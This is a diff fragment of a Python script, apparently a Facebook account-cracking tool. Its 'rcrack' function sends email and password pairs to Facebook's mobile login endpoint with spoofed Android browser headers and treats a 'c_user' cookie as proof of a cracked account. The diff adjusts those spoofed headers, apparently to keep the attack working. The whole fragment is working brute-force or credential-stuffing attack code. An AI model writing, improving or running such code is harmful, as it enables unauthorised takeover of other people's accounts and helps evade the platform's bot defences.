@@ -924,7 +924,7 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"Host": 'm.beta.facebook.com',
+            header_freefb = {"authority": 'm.beta.facebook.com',
 	    'method': 'GET',
 	    'scheme': 'https',
 	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -936,13 +936,12 @@ def rcrack(uid,pwx,tl):
 	    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
-	    'sec-ch-ua-platform-version': '"12.0.0"',
 	    'sec-fetch-dest': 'document',
 	    'sec-fetch-mode': 'navigate',
 	    'sec-fetch-site': 'same-origin',
 	    'sec-fetch-user': '?1',
 	    'upgrade-insecure-requests': '1',
-        'user-agent': ua}
+            'user-agent': ua}
             lo = session.post('https://m.beta.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
